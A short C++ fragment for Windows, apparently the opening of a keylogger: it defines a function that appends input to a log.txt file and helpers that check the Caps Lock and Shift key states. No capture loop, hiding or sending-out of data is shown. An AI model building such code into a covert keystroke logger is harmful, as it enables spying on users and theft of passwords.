#include <Windows.h>
#include <winuser.h>
#include <bits/stdc++.h>
#include <fstream>

using namespace std;

void LOG(string input) {
	fstream LogFile;
	LogFile.open("log.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

bool CapsLock_isOn(){
	return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
}

bool Shift_isOn(){
	return(GetKeyState(VK_SHIFT) & 0x8000) != 0;
}